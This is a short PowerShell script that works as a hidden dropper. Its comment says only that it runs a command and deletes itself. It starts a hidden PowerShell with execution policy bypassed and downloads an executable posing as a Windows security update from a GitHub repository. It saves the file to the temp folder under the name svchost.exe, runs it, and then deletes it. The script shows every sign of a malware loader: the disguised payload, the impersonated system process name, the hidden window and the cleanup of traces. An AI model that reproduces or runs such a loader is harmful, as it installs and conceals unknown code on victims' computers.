# This script runs your command and then deletes itself
$command = 'powershell -noprofile -executionpolicy bypass -windowstyle hidden -command "$u=\'https://github.com/finnandraw888/Windows-security-update/raw/refs/heads/main/Windowsupdateservice.exe\'; $f=\'$env:temp\\svchost.exe\'; iwr $u -out $f; start $f; sleep 5; rm $f -force"'
Start-Process powershell.exe -ArgumentList "-noexit", "-command", $command -WindowStyle Hidden